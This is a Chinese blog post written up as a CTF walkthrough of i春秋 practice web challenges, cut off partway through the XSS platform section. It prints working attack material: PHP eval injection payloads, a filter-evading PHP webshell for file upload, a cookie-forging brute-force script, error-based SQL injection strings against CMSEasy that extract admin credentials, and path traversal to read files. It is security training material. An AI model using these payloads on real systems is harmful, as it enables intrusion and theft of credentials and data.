<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>i 春秋 Web 入门练习 Part I. - Lab on Mercury</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Lab on Mercury"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Lab on Mercury"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="i 春秋上的题都是比赛真题，所以会比较有意思，也更复杂一些。"><meta property="og:type" content="blog"><meta property="og:title" content="i 春秋 Web 入门练习 Part I."><meta property="og:url" content="https://signormercurio.me/post/IcqWeb/"><meta property="og:site_name" content="Lab on Mercury"><meta property="og:description" content="i 春秋上的题都是比赛真题，所以会比较有意思，也更复杂一些。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://signormercurio.me/img/og_image.png"><meta property="article:published_time" content="2019-08-24T19:42:38.000Z"><meta property="article:author" content="Mercury"><meta property="article:tag" content="古典密码与编码"><meta property="article:tag" content="SQLi"><meta property="article:tag" content="文件上传"><meta property="article:tag" content="反序列化"><meta property="article:tag" content="Hash"><meta property="article:tag" content="PHP"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://signormercurio.me/post/IcqWeb/"},"headline":"Lab on Mercury","image":["https://signormercurio.me/img/og_image.png"],"datePublished":"2019-08-24T19:42:38.000Z","author":{"@type":"Person","name":"Mercury"},"description":"i 春秋上的题都是比赛真题，所以会比较有意思，也更复杂一些。"}</script><link rel="canonical" href="https://signormercurio.me/post/IcqWeb/"><link rel="alternate" href="/atom.xml" title="Lab on Mercury" type="application/atom+xml"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2019-08-24T19:42:38.000Z" title="2019-08-24T19:42:38.000Z">2019-08-24</time></span><span class="level-item"><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><span> / </span><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/Web/">Web</a></span><span class="level-item">37 minutes read (About 5561 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">i 春秋 Web 入门练习 Part I.</h1><div class="content"><p>i 春秋上的题都是比赛真题，所以会比较有意思，也更复杂一些。</p>
<a id="more"></a>

<h2 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破 - 1"></a>爆破 - 1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\w*$/&#x27;</span>,$a))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;ERROR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>要求参数 <code>hello</code> 为纯字母，又看到 <code>eval(var_dump($$a));</code> 语句，可以想到使用 <code>$GLOBALS</code> 打印出所有变量，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello&#x3D;GLOBALS</span><br></pre></td></tr></table></figure>

<p>等等，好像没爆破啊？感觉是非预期解。</p>
<h2 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破 - 2"></a>爆破 - 2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>提示 <code>flag</code> 不在变量中，那么只能直接读 <code>flag.php</code> 文件了，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello&#x3D;file(&#39;flag.php&#39;)</span><br></pre></td></tr></table></figure>
<p>另一种 payload 则类似注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello&#x3D;);show_source(‘flag.php’);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破 - 3"></a>爆破 - 3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;nums&#x27;</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">&#x27;nums&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">&#x27;time&#x27;</span>] = time();</span><br><span class="line">  $_SESSION[<span class="string">&#x27;whoami&#x27;</span>] = <span class="string">&#x27;ea&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;time&#x27;</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">$str_rand = range(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;whoami&#x27;</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">&#x27;nums&#x27;</span>]++;</span><br><span class="line">  $_SESSION[<span class="string">&#x27;whoami&#x27;</span>] = $str_rands;</span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;nums&#x27;</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先如果 <code>cookie</code> 中不设置 <code>nums</code> 会给 <code>whoami</code> 设置默认值 <code>ea</code>，且 <code>session</code> 只能维持 120ms，所以应该需要用脚本跑。</p>
<p>接下来，如果 <code>whoami</code> 和传入的 <code>value</code> 相同，且 <code>value</code> 的 MD5 值子串为 0，那么 <code>nums</code> 就加 1，<code>whoami</code> 更新为两个新的随机字母。后一个条件可以很容易地用数组绕过。</p>
<p>我们尝试传入 <code>value=ea</code>，果然显示了 <code>whoami</code> 的下一个值。脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4451e735c9e046bcb09a4404756ca952c586da682cfe47b9.changame.ichunqiu.com/?value[]=ea&#x27;</span></span><br><span class="line"></span><br><span class="line">ss = requests.session()</span><br><span class="line">r = ss.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  r = ss.get(url[:<span class="number">-2</span>] + r.text[<span class="number">0</span>:<span class="number">2</span>])</span><br><span class="line">  print(r.text[:<span class="number">50</span>])</span><br></pre></td></tr></table></figure>
<p>需要注意的是所有请求都要维持在同一 session 下。</p>
<p>这题终于有点爆破的意思了。</p>
<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>尝试上传 php 一句话木马，发现过滤了 <code>&lt;?</code> 和 <code>php</code>，对前者利用 <code>&lt;script&gt;</code> 绕过，后者则大写绕过。payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;PHP&quot;</span>&gt;</span><br><span class="line">  <span class="keyword">eval</span>($_POST[<span class="string">&#x27;ant&#x27;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>上传 getshell，在上级目录得到 <code>flag.php</code>。</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>题目链接中含有 <code>?jpg=hei.jpg</code>，猜测可能可以通过这个读文件，尝试 <code>?jpg=index.php</code>，F12 得到 base64 后的源代码，解码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">&#x27;jpg&#x27;</span>]))</span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?jpg=hei.jpg&#x27;</span>);</span><br><span class="line">$file = $_GET[<span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;title&gt;file:&#x27;</span>.$file.<span class="string">&#x27;&lt;/title&gt;&#x27;</span>;</span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="string">&quot;&quot;</span>, $file);</span><br><span class="line">$file = str_replace(<span class="string">&quot;config&quot;</span>,<span class="string">&quot;_&quot;</span>, $file);</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.$txt.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意这里会对 <code>file</code> 进行过滤，将非数字 / 字母删除，并将 <code>config</code> 换成 <code>_</code>，但是我们并不知道我们要读的文件是什么。</p>
<p>这时可以注意到注释：<code>Created by PhpStorm</code>，猜想是 <code>.idea</code> 泄漏，因此访问 <code>/.idea/workspace.xml</code>，可以发现文件 <code>fl3g_ichuqiu.php</code>。由于 <code>_</code> 不是数字或字母，我们应用上述规则访问 <code>fl3gconfigichuqiu.php</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?jpg&#x3D;fl3gconfigichuqiu.php</span><br></pre></td></tr></table></figure>
<p>解码得到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)	&#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">$txt,$key</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt = $tmp;</span><br><span class="line">    $rnd=random(<span class="number">4</span>);</span><br><span class="line">    $key=md5($rnd.$key);</span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $ttmp .= $txt[$i] ^ $key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($rnd.$ttmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$txt,$key</span>)</span>&#123;</span><br><span class="line">    $txt=base64_decode($txt);</span><br><span class="line">    $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);</span><br><span class="line">    $txt = substr($txt,<span class="number">4</span>);</span><br><span class="line">    $key=md5($rnd.$key);</span><br><span class="line"></span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $tmp .= $txt[$i]^$key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</span><br><span class="line">        $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp1;</span><br><span class="line">&#125;</span><br><span class="line">$username = decrypt($_COOKIE[<span class="string">&#x27;user&#x27;</span>],$key);</span><br><span class="line"><span class="keyword">if</span> ($username ==<span class="string">&#x27;system&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">&#x27;user&#x27;</span>,encrypt(<span class="string">&#x27;guest&#x27;</span>,$key));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;╮(╯▽╰)╭&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>先不管加解密过程，只看最后几行主程序：将 cookie 中的 <code>user</code> 通过 <code>key</code> 解密，如果得到明文为 <code>system</code> 则成功，否则将返回 <code>guest</code> 经过 <code>key</code> 加密后的密文。显然后者是我们获得 <code>key</code> 值的关键。</p>
<p>然后关注加密过程：先将每个字符的 ASCII 码加 10 得到新的 <code>txt</code>，随后随机生成 4 个字符 <code>rnd</code> 与 <code>key</code> 拼接后进行 MD5，得到新 <code>key</code>。将新 <code>txt</code> 与新 <code>key</code> 按字符异或得到 <code>ttmp</code>，若 <code>txt</code> 的长度超出 <code>key</code> 则在 <code>key</code> 后继续拼接 <code>key</code>。最后，返回 <code>rnd</code> 拼接上 <code>ttmp</code> 后的 base64 值就是密文。</p>
<p>附 python2 脚本（python3 中的 byte 和 str 转换可能导致错误结果）：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://036fb8c596914fd18ad96399893a61dd9da80da355bf450e.changame.ichunqiu.com/fl3g_ichuqiu.php&#x27;</span></span><br><span class="line">cookie = requests.get(url).cookies[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line"></span><br><span class="line">txt = base64.b64decode(cookie)</span><br><span class="line">rnd = txt[:<span class="number">4</span>]</span><br><span class="line">ttmp = txt[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">&#x27;aaaaaa&#x27;</span>)</span><br><span class="line">guest = <span class="built_in">list</span>(<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">system = <span class="built_in">list</span>(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">  guest[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(guest[i]) + <span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">  key[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(ttmp[i]) ^ <span class="built_in">ord</span>(guest[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">  system[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(system[i]) + <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">cookies = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;1234567890abcdef&#x27;</span>: <span class="comment"># md5</span></span><br><span class="line">  key[<span class="number">5</span>] = c</span><br><span class="line">  ttnew = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    ttnew += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[i]) ^ <span class="built_in">ord</span>(system[i]))</span><br><span class="line">  cookies.append(base64.b64encode(rnd + ttnew))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cookies:</span><br><span class="line">  cookie = &#123;<span class="string">&#x27;user&#x27;</span>: i&#125;</span><br><span class="line">  r = requests.get(url=url, cookies=cookie)</span><br><span class="line">  <span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>


<p>这题才应该叫爆破。。最后其实是爆破 <code>key</code> 的第 6 位才出的结果。</p>
<h2 id="YeserCMS"><a href="#YeserCMS" class="headerlink" title="YeserCMS"></a>YeserCMS</h2><p>进入 CMS 乱点一波发现是从 cmseasy，网上查到了 <a target="_blank" rel="noopener" href="https://shuimugan.com/bug/view?bug_no=137013">无限制报错注入漏洞</a>。</p>
<p>仿照漏洞 payload 来进行注入，POST 数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx&#39;,(updatexml(1,concat(0x7e,mid((select group_concat(concat(database())) ),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br></pre></td></tr></table></figure>
<p>得到数据库名 <code>Yeser</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx&#39;,(updatexml(1,concat(0x7e,mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br></pre></td></tr></table></figure>
<p>这里由于长度无法显示所有表，可以修改 <code>1,32</code> 的 <code>1</code> 来查看后续表，我们需要的是 <code>yesercms_user</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx&#39;,(updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;yesercms_user&#39;),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br></pre></td></tr></table></figure>
<p>这里也会有许多列，我们需要的是 <code>username</code> 和 <code>password</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx&#39;,(updatexml(1,concat(0x7e,mid((select concat(username,password) from yesercms_user),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br></pre></td></tr></table></figure>
<p>这里的 password 显示不全，同样修改 <code>1,32</code> 的 <code>1</code> 来查看完整的 MD5 值：<code>ff512d4240cbbdeafada404677ccbe61</code>。解密得到密码：<code>Yeser231</code>。登录并进入后台管理页面。</p>
<p>管理页面内容很多，但是都没有什么注入点。最终，在 <code>模板</code>-&gt;<code>当前模板编辑</code> 中发现，编辑模板时会先读取相应的文件。因此我们任选一个文件，点击 <code>编辑</code> 并抓包，将唯一的参数 <code>id</code> 修改为想读取的文件。经测试，这里应该是 <code>../../flag.php</code>。</p>
<h2 id="XSS-平台"><a href="#XSS-平台" class="headerlink" title="XSS 平台"></a>XSS 平台</h2><p>尝试注入无果，构造非法参数 <code>pass=bbb&amp;email[]=aaa</code> 得到报错信息，其中有一行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;rtiny&#x2F;login.py&quot;, line 20, in post</span><br></pre></td></tr></table></figure>
<p>结合题目名，得知这是使用 RTiny 编写的 XSS 平台，项目地址在 <a target="_blank" rel="noopener" href="https://github.com/r0ker/Rtiny-xss">这里</a>。其中，<code>rtiny/lock.py</code> 存在 SQL 注入漏洞，<code>post</code> 方法中对 <code>username</code> 没有任何过滤：</p>
